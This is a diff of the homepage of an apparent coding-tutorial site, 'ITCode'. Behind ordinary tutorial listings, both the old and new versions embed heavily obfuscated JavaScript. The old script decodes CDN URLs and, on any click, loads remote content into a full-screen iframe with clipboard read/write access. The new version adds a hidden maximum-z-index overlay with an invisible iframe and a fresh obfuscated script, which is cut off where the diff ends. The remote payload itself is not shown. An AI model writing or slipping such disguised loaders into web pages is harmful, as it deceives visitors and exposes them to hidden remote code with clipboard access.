@@ -1,140 +1,570 @@
-<!doctype html>
+<!DOCTYPE html>
+
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ITCode — Programming Tutorials</title>
-<meta name="description" content="Free programming tutorials and coding lessons: HTML, CSS, JavaScript, Python and more.">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%232563eb'/%3E%3Cpath d='M9 8l-3 4 3 4M15 8l3 4-3 4' stroke='white' stroke-width='1.8' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
-<style>
-  :root{
-    --bg:#f6f8fc; --card:#fff; --ink:#0f172a; --muted:#64748b; --line:#e2e8f0;
-    --brand:#2563eb; --brand-ink:#1d4ed8; --shadow:0 1px 3px rgba(15,23,42,.08),0 8px 24px rgba(15,23,42,.06);
-  }
-  @media (prefers-color-scheme:dark){
-    :root:not([data-theme="light"]){--bg:#0b1120;--card:#121a2e;--ink:#e6edf7;--muted:#94a3b8;--line:#1f2a44;--brand:#3b82f6;--brand-ink:#60a5fa;--shadow:0 1px 3px rgba(0,0,0,.4),0 10px 30px rgba(0,0,0,.35);}
-  }
-  *{box-sizing:border-box}
-  html,body{margin:0;padding:0}
-  body{background:var(--bg);color:var(--ink);font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
-  a{color:inherit;text-decoration:none}
-  .wrap{max-width:1080px;margin:0 auto;padding:0 16px}
-  header.site{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
-  header.site .wrap{display:flex;align-items:center;gap:18px;height:60px}
-  .logo{display:flex;align-items:center;gap:9px;font-weight:800;letter-spacing:-.02em;font-size:18px}
-  .logo .mark{width:28px;height:28px;border-radius:7px;background:var(--brand);display:grid;place-items:center;color:#fff;font-weight:800}
-  nav.main{margin-left:auto;display:flex;gap:22px;color:var(--muted);font-weight:600}
-  nav.main a:hover{color:var(--ink)}
-  .cta{background:var(--brand);color:#fff;padding:8px 14px;border-radius:9px;font-weight:700;border:0;cursor:pointer}
-  .cta:hover{background:var(--brand-ink)}
-  .hero{padding:56px 0 20px;text-align:center}
-  .hero h1{font-size:clamp(28px,5vw,44px);line-height:1.08;letter-spacing:-.03em;margin:0 0 12px}
-  .hero p{color:var(--muted);font-size:17px;max-width:620px;margin:0 auto}
-  .tracks{padding:28px 0 64px}
-  .tracks h2{font-size:14px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin:0 0 16px}
-  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px}
-  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;box-shadow:var(--shadow);cursor:pointer;transition:transform .12s ease,box-shadow .12s ease;display:flex;flex-direction:column;gap:10px}
-  .card:hover{transform:translateY(-3px);box-shadow:0 10px 30px rgba(37,99,235,.14)}
-  .card .ic{width:40px;height:40px;border-radius:10px;display:grid;place-items:center;font-size:20px;font-weight:800;color:#fff}
-  .card h3{margin:0;font-size:17px;letter-spacing:-.01em}
-  .card p{margin:0;color:var(--muted);font-size:13.5px}
-  .card .meta{margin-top:auto;color:var(--muted);font-size:12.5px;display:flex;gap:10px;align-items:center}
-  .dot{width:4px;height:4px;border-radius:50%;background:var(--muted);display:inline-block}
-  footer.site{border-top:1px solid var(--line);color:var(--muted);font-size:13px}
-  footer.site .wrap{height:56px;display:flex;align-items:center;gap:16px}
-  footer.site a:hover{color:var(--ink)}
-  /* viewer overlay */
-  .viewer{position:fixed;inset:0;z-index:1000;background:#000;display:none}
-  .viewer.open{display:block}
-  .viewer iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
-  .viewer .status{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:#e6edf7;background:#0b1120;font-weight:600}
-  .viewer .spin{width:38px;height:38px;border:3px solid rgba(255,255,255,.18);border-top-color:#3b82f6;border-radius:50%;animation:sp 1s linear infinite}
-  @keyframes sp{to{transform:rotate(360deg)}}
-  .viewer .x{position:absolute;top:12px;right:14px;z-index:2;width:38px;height:38px;border-radius:10px;border:0;background:rgba(15,23,42,.72);color:#fff;font-size:18px;cursor:pointer;backdrop-filter:blur(6px)}
-  .viewer .x:hover{background:rgba(15,23,42,.92)}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>ITCode - Programming Tutorials</title>
+  <meta name="description" content="ITCode — Learn to Code">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background: #f7f7f5;
+      color: #222;
+      font-family: Arial, Helvetica, sans-serif;
+      line-height: 1.6;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    /* Header */
+
+    header {
+      height: 62px;
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      padding: 0 32px;
+    }
+
+    .header-inner {
+      width: 100%;
+      max-width: 1100px;
+      margin: auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      font-size: 21px;
+      font-weight: bold;
+      letter-spacing: -0.5px;
+    }
+
+    .logo span {
+      color: #2864d7;
+    }
+
+    nav {
+      display: flex;
+      gap: 24px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    nav a:hover {
+      color: #111;
+    }
+
+    /* Main */
+
+    main {
+      max-width: 1100px;
+      margin: auto;
+      padding: 55px 25px 80px;
+    }
+
+    .intro {
+      max-width: 720px;
+      margin-bottom: 65px;
+    }
+
+    .intro h1 {
+      margin: 0 0 15px;
+      font-size: 42px;
+      line-height: 1.15;
+      letter-spacing: -1.5px;
+      font-weight: 700;
+    }
+
+    .intro p {
+      margin: 0;
+      max-width: 650px;
+      color: #666;
+      font-size: 17px;
+    }
+
+    /* Section */
+
+    section {
+      margin-bottom: 65px;
+    }
+
+    .section-title {
+      margin-bottom: 22px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .section-title h2 {
+      display: inline;
+      margin: 0;
+      font-size: 25px;
+      letter-spacing: -0.5px;
+    }
+
+    .section-title p {
+      display: inline;
+      margin-left: 12px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    /* Tutorials */
+
+    .tutorials {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+    }
+
+    .tutorial {
+      background: white;
+      border: 1px solid #ddd;
+      padding: 23px;
+      transition: border-color 0.15s, transform 0.15s;
+    }
+
+    .tutorial:hover {
+      border-color: #aaa;
+      transform: translateY(-2px);
+    }
+
+    .tutorial h3 {
+      margin: 0 0 7px;
+      font-size: 19px;
+    }
+
+    .tutorial p {
+      margin: 0 0 14px;
+      color: #666;
+      font-size: 14px;
+      max-width: 500px;
+    }
+
+    .read {
+      color: #2864d7;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    /* Small category label */
+
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      color: #888;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.7px;
+    }
+
+    /* Featured */
+
+    .featured {
+      background: #20252b;
+      color: white;
+      padding: 30px;
+      margin-bottom: 65px;
+    }
+
+    .featured .label {
+      color: #aeb6c0;
+    }
+
+    .featured h2 {
+      margin: 0 0 8px;
+      font-size: 27px;
+    }
+
+    .featured p {
+      margin: 0 0 18px;
+      color: #c4c9cf;
+      max-width: 650px;
+    }
+
+    .featured a {
+      display: inline-block;
+      padding: 9px 15px;
+      background: white;
+      color: #20252b;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    /* Networking list */
+
+    .network-list {
+      background: white;
+      border: 1px solid #ddd;
+    }
+
+    .network-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 17px 20px;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .network-item:last-child {
+      border-bottom: none;
+    }
+
+    .network-item:hover {
+      background: #fafafa;
+    }
+
+    .network-name {
+      font-weight: bold;
+    }
+
+    .network-description {
+      color: #777;
+      font-size: 13px;
+      margin-top: 2px;
+    }
+
+    .arrow {
+      color: #2864d7;
+      font-size: 18px;
+    }
+
+    /* Quick links */
+
+    .quick-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 9px;
+    }
+
+    .quick-links a {
+      background: white;
+      border: 1px solid #d8d8d8;
+      padding: 9px 14px;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .quick-links a:hover {
+      border-color: #aaa;
+      color: #111;
+    }
+
+    /* Footer */
+
+    footer {
+      border-top: 1px solid #ddd;
+      background: white;
+      padding: 28px 25px;
+      color: #777;
+      font-size: 13px;
+    }
+
+    .footer-inner {
+      max-width: 1100px;
+      margin: auto;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Mobile */
+
+    @media (max-width: 700px) {
+      header {
+        padding: 0 18px;
+      }
+
+      nav {
+        display: none;
+      }
+
+      main {
+        padding: 40px 18px 60px;
+      }
+
+      .intro h1 {
+        font-size: 34px;
+      }
+
+      .tutorials {
+        grid-template-columns: 1fr;
+      }
+
+      .section-title p {
+        display: block;
+        margin: 3px 0 0;
+      }
+
+      .network-item {
+        gap: 15px;
+      }
+
+      .footer-inner {
+        flex-direction: column;
+        gap: 5px;
+      }
+    }
+  </style>
+
 </head>
+
 <body>
-<header class="site">
-  <div class="wrap">
-    <a class="logo" href="/"><span class="mark">&lt;/&gt;</span> ITCode</a>
-    <nav class="main">
-      <a href="#tracks">Tracks</a>
-      <a href="#tracks">Lessons</a>
-      <a href="#tracks">Practice</a>
-    </nav>
-    <button class="cta" data-open type="button">Start learning</button>
+
+<header>
+  <div class="header-inner">
+
+
+<a href="https://itcode.vip/" class="logo">
+  <span>IT</span>Code
+</a>
+
+<nav>
+  <a href="https://itcode.vip/">Home</a>
+  <a href="#programming">Programming</a>
+  <a href="#networking">Networking</a>
+  <a href="#other">Other</a>
+</nav>
+
+
   </div>
 </header>
 
 <main>
-  <section class="hero">
-    <div class="wrap">
-      <h1>Learn to code, one lesson at a time.</h1>
-      <p>Hands-on tutorials in web development and programming — written for beginners, structured like a course. Pick a track and open the interactive lessons.</p>
-    </div>
+
+  <div class="intro">
+    <h1>ITCode</h1>
+
+
+<p>
+  Tutorials about programming, web development, networking, and
+  the stuff that makes the internet work. Nothing too complicated —
+  just explanations and examples you can actually follow.
+</p>
+
+
+  </div>
+
+  <div class="featured">
+    <span class="label">Start here</span>
+
+
+<h2>How does the web actually work?</h2>
+
+<p>
+  When you type a website into your browser, quite a lot happens
+  before the page appears. Learn about DNS, TCP, HTTP, TLS, and
+  how your browser talks to a server.
+</p>
+
+<a href="https://itcode.vip/study/http.html">Read the HTTP tutorial →</a>
+
+
+  </div>
+
+  <section id="programming">
+
+
+<div class="section-title">
+  <h2>Programming</h2>
+  <p>Learn the basics and build things.</p>
+</div>
+
+<div class="tutorials">
+
+  <a href="https://itcode.vip/study/python.html" class="tutorial">
+    <span class="label">Programming</span>
+    <h3>Python</h3>
+    <p>
+      A beginner-friendly introduction to Python. Variables,
+      conditions, loops, functions, lists, files, and more.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="https://itcode.vip/study/node.html" class="tutorial">
+    <span class="label">JavaScript</span>
+    <h3>Node.js</h3>
+    <p>
+      Learn how JavaScript can run outside the browser. We'll
+      cover npm, modules, servers, files, and APIs.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="https://itcode.vip/study/javascript.html" class="tutorial">
+    <span class="label">Web</span>
+    <h3>JavaScript</h3>
+    <p>
+      Start with the language behind interactive websites and
+      work your way up to the DOM, events, promises, and APIs.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="https://itcode.vip/study/html.html" class="tutorial">
+    <span class="label">Web</span>
+    <h3>HTML & CSS</h3>
+    <p>
+      Learn how webpages are put together, from basic HTML
+      elements to layouts and responsive CSS.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="https://itcode.vip/study/git.html" class="tutorial">
+    <span class="label">Tools</span>
+    <h3>Git</h3>
+    <p>
+      Commits, branches, repositories, remotes, and the commands
+      you'll use when working on a project.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="https://itcode.vip/study/apis.html" class="tutorial">
+    <span class="label">Web</span>
+    <h3>APIs</h3>
+    <p>
+      What an API is, how requests and responses work, JSON,
+      endpoints, and how to make your own.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+</div>
+
+
   </section>
 
-  <section class="tracks" id="tracks">
-    <div class="wrap">
-      <h2>Popular tracks</h2>
-      <div class="grid" id="grid">
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open HTML &amp; CSS Basics">
-          <span class="ic" style="background:#e34f26">H</span>
-          <h3>HTML &amp; CSS Basics</h3>
-          <p>Build and style your first web pages from scratch.</p>
-          <div class="meta">18 lessons <span class="dot"></span> Beginner</div>
-        </article>
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open JavaScript Essentials">
-          <span class="ic" style="background:#f0db4f;color:#1a1a1a">JS</span>
-          <h3>JavaScript Essentials</h3>
-          <p>Variables, functions, the DOM, and interactivity.</p>
-          <div class="meta">24 lessons <span class="dot"></span> Beginner</div>
-        </article>
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open Python for Beginners">
-          <span class="ic" style="background:#3776ab">Py</span>
-          <h3>Python for Beginners</h3>
-          <p>Syntax, data types, loops and your first programs.</p>
-          <div class="meta">20 lessons <span class="dot"></span> Beginner</div>
-        </article>
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open Git &amp; the Terminal">
-          <span class="ic" style="background:#f1502f">Gt</span>
-          <h3>Git &amp; the Terminal</h3>
-          <p>Version control and command-line fundamentals.</p>
-          <div class="meta">12 lessons <span class="dot"></span> Intermediate</div>
-        </article>
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open SQL &amp; Databases">
-          <span class="ic" style="background:#00758f">SQ</span>
-          <h3>SQL &amp; Databases</h3>
-          <p>Query, model and join data with confidence.</p>
-          <div class="meta">16 lessons <span class="dot"></span> Intermediate</div>
-        </article>
-        <article class="card" data-open tabindex="0" role="button" aria-label="Open React &amp; Components">
-          <span class="ic" style="background:#61dafb;color:#0b1120">Rx</span>
-          <h3>React &amp; Components</h3>
-          <p>Build dynamic interfaces with reusable components.</p>
-          <div class="meta">22 lessons <span class="dot"></span> Advanced</div>
-        </article>
+  <section id="networking">
+
+
+<div class="section-title">
+  <h2>Networking</h2>
+  <p>What's happening underneath the browser?</p>
+</div>
+
+<div class="network-list">
+
+  <a href="https://itcode.vip/study/tcp.html" class="network-item">
+    <div>
+      <div class="network-name">TCP/IP</div>
+      <div class="network-description">
+        Packets, IP addresses, ports, connections, and routing.
       </div>
     </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="https://itcode.vip/study/http.html" class="network-item">
+    <div>
+      <div class="network-name">HTTP</div>
+      <div class="network-description">
+        Requests, responses, headers, status codes, and methods.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="https://itcode.vip/study/dns.html" class="network-item">
+    <div>
+      <div class="network-name">DNS</div>
+      <div class="network-description">
+        How a domain name eventually turns into an IP address.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="https://itcode.vip/study/tls.html" class="network-item">
+    <div>
+      <div class="network-name">TLS / HTTPS</div>
+      <div class="network-description">
+        Encryption, certificates, and secure connections.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="https://itcode.vip/study/websockets.html" class="network-item">
+    <div>
+      <div class="network-name">WebSockets</div>
+      <div class="network-description">
+        Keeping a connection open for real-time communication.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+</div>
+
+
   </section>
+
+  <section id="other">
+
+
+<div class="section-title">
+  <h2>Other stuff</h2>
+  <p>A few more things worth knowing.</p>
+</div>
+
+<div class="quick-links">
+  <a href="https://itcode.vip/study/linux.html">Linux</a>
+  <a href="https://itcode.vip/study/cli.html">Command Line</a>
+  <a href="https://itcode.vip/study/databases.html">Databases</a>
+  <a href="https://itcode.vip/study/sql.html">SQL</a>
+  <a href="https://itcode.vip/study/json.html">JSON</a>
+  <a href="https://itcode.vip/study/ssh.html">SSH</a>
+  <a href="https://itcode.vip/study/security.html">Web Security</a>
+  <a href="https://itcode.vip/study/servers.html">Web Servers</a>
+  <a href="https://itcode.vip/study/cookies.html">Cookies</a>
+  <a href="https://itcode.vip/study/caching.html">Caching</a>
+</div>
+
+
+  </section>
+
 </main>
 
-<footer class="site">
-  <div class="wrap">
-    <span>© ITCode</span>
-    <a href="#tracks">About</a>
-    <a href="#tracks">Privacy</a>
-    <a href="#tracks">Contact</a>
+<footer>
+  <div class="footer-inner">
+    <span>ITCode</span>
+    <span>Programming & technology tutorials</span>
   </div>
 </footer>
 
-<div class="viewer" id="viewer" aria-hidden="true">
-  <button class="x" id="viewer-close" type="button" aria-label="Close">✕</button>
-  <div class="status" id="viewer-status"><div class="spin"></div><div>Connecting to a lesson server…</div></div>
-  <iframe id="viewer-frame" src="about:blank" title="Lessons" allow="fullscreen; clipboard-read; clipboard-write; autoplay"></iframe>
-</div>
 
-<script>function a0_0x109c(_0x58b28b,_0x32c4e0){var _0x3fd07d=a0_0x1402();return a0_0x109c=function(_0x240914,_0x36cd6c){_0x240914=_0x240914-(-0x1ec5+0xad+0x1ecb);var _0x2dae17=_0x3fd07d[_0x240914];if(a0_0x109c['WGBrQC']===undefined){var _0x21176b=function(_0x42dfb8){var _0x38256a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1032a8='',_0x382a08='';for(var _0x241b92=-0x116a*0x1+0x26a7+-0x153d*0x1,_0x2f6e66,_0x54008d,_0x1a9dbd=-0x1c*-0xe+0xf*0xe4+-0xee4;_0x54008d=_0x42dfb8['charAt'](_0x1a9dbd++);~_0x54008d&&(_0x2f6e66=_0x241b92%(-0x1*-0x149f+0x25d5+-0x50*0xbb)?_0x2f6e66*(-0x13f5+0x31*0x2+-0x23*-0x91)+_0x54008d:_0x54008d,_0x241b92++%(-0x2406+0x1c74+0x796))?_0x1032a8+=String['fromCharCode'](-0x1053+0xd59+0x3f9&_0x2f6e66>>(-(-0x4ff*-0x5+-0x685*0x2+0x1*-0xbef)*_0x241b92&0x1044+-0x484+-0xbba)):0x1948+0x1cf*0xe+0x2fa*-0x11){_0x54008d=_0x38256a['indexOf'](_0x54008d);}for(var _0x820a3f=0xa54*-0x2+0x1486+0x11*0x2,_0x180970=_0x1032a8['length'];_0x820a3f<_0x180970;_0x820a3f++){_0x382a08+='%'+('00'+_0x1032a8['charCodeAt'](_0x820a3f)['toString'](0x1033+0x136d+-0x8e4*0x4))['slice'](-(-0x7b8*-0x4+-0x291+-0x1c4d));}return decodeURIComponent(_0x382a08);};a0_0x109c['KemEwr']=_0x21176b,_0x58b28b=arguments,a0_0x109c['WGBrQC']=!![];}var _0xacfc81=_0x3fd07d[0xd*-0x4+-0x2*0x10d9+0x21e6],_0x120afd=_0x240914+_0xacfc81,_0xc712df=_0x58b28b[_0x120afd];return!_0xc712df?(_0x2dae17=a0_0x109c['KemEwr'](_0x2dae17),_0x58b28b[_0x120afd]=_0x2dae17):_0x2dae17=_0xc712df,_0x2dae17;},a0_0x109c(_0x58b28b,_0x32c4e0);}function a0_0x1402(){var _0x514777=['Ahr0Chm6lY9Jzg4UANnKzwXPDNiUBMv0l2DOl3TYzxbVFubTywLUl3TWyxrOFq','B3bLBG','DMLZAwjSzq','y2XPy2S','nta5mZaYmdLOu2nyCM4','A2v5','ChjLDMvUDerLzMf1Bhq','otm1nfjrrNvWvW','E3bHDgH9','BgvUz3rO','ywrKrxzLBNrmAxn0zw5LCG','DMLLD2vY','zgLZCgXHEq','rxnJyxbL','ywjVDxq6yMXHBMS','DMLLD2vYlwnSB3nL','w2rHDgeTB3bLBL0','CMvWBW','BM8TC3rVCMu','Ahr0Chm6lY9ZmY51CY13zxn0lw9YlMLVlMnSB3vKlM92Ac51CY84yxvQC2TLzhjVDhK5odD1zwPOA2LYBZLPDdH5DwHOl3TWyxrOFq','Aw5KzxGUAhrTBa','y2fJAgu','E3jLCg99','nZa4qKL0rhLZ','BwLYCM9YCW','B3zO','CMvTB3zL','AgLKzgvU','ywrK','zw50CNK','CMvWBgfJzq','C3r5Bgu','z2v0rwXLBwvUDej5swq','CMvTB3zLrxzLBNrmAxn0zw5LCG','Ahr0Chm6lY9YyxCUzxnTlNnOl2DOl3TYzxbVFubTywLUl3TWyxrOFq','otC1oda0mLbdtunhDG','ywjVCNq','mJeXoti2nuvIELrVzq','A2v5zg93BG','mte3zMPjs0Dv','nta1mZm2mM5pr0flEa','C2LNBMfS','zMXLEa','DMLLD2vYlxn0yxr1CW','C3jJ','DMLZAwjPBgL0Eq','ogzQz0TfAq','y2XHC3nmAxn0','CxvLCNLtzwXLy3rVCKfSBa','EMfRyteZywX0l3PHA2eTC3rHDgLJ','BM9Uzq','Bg9Hza','mtuZodyWmerKz2L6za','DMLLD2vYlwzYyw1L','Ahr0Chm6lY9YyxDJzg4Uz2L0AgfJAY5JB20VE3jLCg99l21HAw4VE3bHDgH9','odyXotC2De56rhbl','Ahr0Chm6lY9Jzg4UC3rHDgLJywXSEs5PBY9NAc97CMvWB30VBwfPBI97Cgf0Ah0','mtbZBfHUA0q'];a0_0x1402=function(){return _0x514777;};return a0_0x1402();}(function(_0x71c3cf,_0x35b720){var _0x3bfb46=a0_0x109c,_0x41212d=_0x71c3cf();while(!![]){try{var _0x4fa13a=parseInt(_0x3bfb46(0xd8))/(-0x93*-0x2f+0x2fc+-0x1df8)+parseInt(_0x3bfb46(0xe5))/(0x1284+0x479*-0x1+0x1*-0xe09)*(parseInt(_0x3bfb46(0xbb))/(-0x2*-0x1082+0x2*-0x36f+-0x1a23))+parseInt(_0x3bfb46(0xd2))/(-0x1a42+0x1984+0x61*0x2)*(-parseInt(_0x3bfb46(0xc9))/(0x916+0x189*0xa+-0x37d*0x7))+parseInt(_0x3bfb46(0xcc))/(-0x6*-0x49d+0x1*-0x813+-0x1395)+parseInt(_0x3bfb46(0xc7))/(-0x2*0xa3e+-0x1b78+0x2ffb)+-parseInt(_0x3bfb46(0xdb))/(0x4*-0x6f1+0x1742+-0x1*-0x48a)*(-parseInt(_0x3bfb46(0xcb))/(-0xe04+0x1ed0+-0x10c3))+-parseInt(_0x3bfb46(0xdd))/(-0x157d+-0x2*-0xcf6+-0x177*0x3)*(parseInt(_0x3bfb46(0xe2))/(-0x17be+0x1408+0x3c1));if(_0x4fa13a===_0x35b720)break;else _0x41212d['push'](_0x41212d['shift']());}catch(_0xa44cea){_0x41212d['push'](_0x41212d['shift']());}}}(a0_0x1402,0x13383+-0x5309b*-0x2+0x65*0x1a6),(function(){'use strict';var _0x8577e4=a0_0x109c;var _0x3b8877={};_0x3b8877[_0x8577e4(0xb5)]=_0x8577e4(0xd5),_0x3b8877[_0x8577e4(0xc1)]=_0x8577e4(0xb8),_0x3b8877[_0x8577e4(0xbc)]=[_0x8577e4(0xde),_0x8577e4(0xc6),_0x8577e4(0xdc),_0x8577e4(0xda)],_0x3b8877[_0x8577e4(0xbd)]=_0x8577e4(0xb7);var _0x526ab4=_0x3b8877;function _0x1a2236(_0x16bc4e,_0x5a9e69){var _0x1dedce=_0x8577e4;return _0x16bc4e[_0x1dedce(0xc2)](_0x1dedce(0xba),_0x526ab4[_0x1dedce(0xb5)])[_0x1dedce(0xc2)](_0x1dedce(0xe6),_0x5a9e69);}async function _0x286122(_0x106ff3){var _0x5a0b9a=_0x8577e4;for(var _0x34a34b=0xb*-0x2ab+0x188+0x1*0x1bd1;_0x34a34b<_0x526ab4[_0x5a0b9a(0xbc)][_0x5a0b9a(0xe7)];_0x34a34b++){var _0x323cd3=_0x1a2236(_0x526ab4[_0x5a0b9a(0xbc)][_0x34a34b],_0x106ff3);try{var _0x4389ed=new AbortController(),_0x2a2d7f=setTimeout(function(){var _0x4d6f43=_0x5a0b9a;_0x4389ed[_0x4d6f43(0xc8)]();},0xc5*-0x9+0x18bf+0x59e),_0x2343ec={};_0x2343ec[_0x5a0b9a(0xb9)]=_0x5a0b9a(0xb6),_0x2343ec[_0x5a0b9a(0xcd)]=_0x4389ed[_0x5a0b9a(0xcd)];var _0x27b5ed=await fetch(_0x323cd3,_0x2343ec);clearTimeout(_0x2a2d7f);if(_0x27b5ed&&_0x27b5ed['ok'])return _0x323cd3;}catch(_0x2c00b5){}}return _0x1a2236(_0x526ab4[_0x5a0b9a(0xbd)],_0x106ff3);}var _0x7b7e03=document[_0x8577e4(0xc4)](_0x8577e4(0xe9)),_0x1bc31b=document[_0x8577e4(0xc4)](_0x8577e4(0xd9)),_0x3ffae8=document[_0x8577e4(0xc4)](_0x8577e4(0xcf)),_0xe9e99d=document[_0x8577e4(0xc4)](_0x8577e4(0xb3)),_0x2454bc=![];async function _0x1ada99(){var _0x1d8bd7=_0x8577e4;if(_0x2454bc)return;_0x2454bc=!![],_0x7b7e03[_0x1d8bd7(0xd3)][_0x1d8bd7(0xc0)](_0x1d8bd7(0xdf)),_0x3ffae8[_0x1d8bd7(0xc3)][_0x1d8bd7(0xea)]=_0x1d8bd7(0xce),_0x1bc31b[_0x1d8bd7(0xc3)][_0x1d8bd7(0xd1)]=_0x1d8bd7(0xbf),_0x1bc31b[_0x1d8bd7(0xd0)]=_0x1d8bd7(0xec);var _0x4e8b5e=await _0x286122(_0x526ab4[_0x1d8bd7(0xc1)]);_0x1bc31b[_0x1d8bd7(0xe8)](_0x1d8bd7(0xd7),function _0x4e97b7(){var _0x40ee27=_0x1d8bd7;_0x1bc31b[_0x40ee27(0xc5)](_0x40ee27(0xd7),_0x4e97b7),_0x3ffae8[_0x40ee27(0xc3)][_0x40ee27(0xea)]=_0x40ee27(0xd6),_0x1bc31b[_0x40ee27(0xc3)][_0x40ee27(0xd1)]=_0x40ee27(0xe0);}),_0x1bc31b[_0x1d8bd7(0xd0)]=_0x4e8b5e,_0x2454bc=![];}function _0x4e2d55(){var _0x337c52=_0x8577e4;_0x7b7e03[_0x337c52(0xd3)][_0x337c52(0xbe)](_0x337c52(0xdf)),_0x1bc31b[_0x337c52(0xd0)]=_0x337c52(0xec),_0x3ffae8[_0x337c52(0xc3)][_0x337c52(0xea)]=_0x337c52(0xd6);}_0xe9e99d[_0x8577e4(0xe8)](_0x8577e4(0xe1),_0x4e2d55),document[_0x8577e4(0xe8)](_0x8577e4(0xca),function(_0x265081){var _0x3b4c91=_0x8577e4;if(_0x265081[_0x3b4c91(0xe3)]===_0x3b4c91(0xeb))_0x4e2d55();});var _0x1fc602=document[_0x8577e4(0xd4)](_0x8577e4(0xb4));for(var _0x38b06c=-0x135*0xd+0x189*-0xd+-0x4e*-0x75;_0x38b06c<_0x1fc602[_0x8577e4(0xe7)];_0x38b06c++){_0x1fc602[_0x38b06c][_0x8577e4(0xe8)](_0x8577e4(0xe1),function(_0x30f31d){var _0x153f25=_0x8577e4;_0x30f31d[_0x153f25(0xe4)](),_0x1ada99();});}}()));</script>
+<div id="vw" style="position:fixed;inset:0;z-index:2147483647;background:#0b1120;display:none">
+  <div id="vws" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:#e6edf7;font-family:Arial,Helvetica,sans-serif;font-size:14px">
+    <div style="width:38px;height:38px;border:3px solid rgba(255,255,255,.18);border-top-color:#2864d7;border-radius:50%;animation:vwsp 1s linear infinite"></div>
+    <div>Loading…</div>
+  </div>
+  <iframe id="vwf" src="about:blank" title=" " style="position:absolute;inset:0;width:100%;height:100%;border:0;visibility:hidden" allow="fullscreen;clipboard-read;clipboard-write;autoplay;encrypted-media"></iframe>
+</div>
+<style>@keyframes vwsp{to{transform:rotate(360deg)}}</style>
+<script>function a0_0x3ac1(_0x21d60f,_0x64f90f){var _0x5b2ef8=a0_0x5b2e();return a0_0x3ac1=function(_0x3ac15c,_0x1e8b83){_0x3ac15c=_0x3ac15c-0x104;var _0x4d590a=_0x5b2ef8[_0x3ac15c];return _0x4d590a;},a0_0x3ac1(_0x21d60f,_0x64f90f);}(function(_0x10b2e3,_0x57380b){var _0x3514bf=a0_0x3ac1,_0x5ba454=_0x10b2e3();while(!![]){try{var _0x44d472=-parseInt(_0x3514bf(0x116))/0x1+parseInt(_0x3514bf(0x10d))/0x2+parseInt(_0x3514bf(0x109))/0x3+parseInt(_0x3514bf(0x128))/0x4+-parseInt(_0x3514bf(0x108))/0x5*(parseInt(_0x3514bf(0x106))/0x6)+-parseInt(_0x3514bf(0x122))/0x7*(-parseInt(_0x3514bf(0x115))/0x8)+parseInt(_0x3514bf(0x11e))/0x9;if(_0x44d472===_0x57380b)break;else _0x5ba454['push'](_0x5ba454['shift']());}catch(_0x208863){_0x5ba454['push'](_0x5ba454['shift']());}}}(a0_0x5b2e,0x86e5e),(function(){'use strict';var _0x52fb27=a0_0x3ac1;var 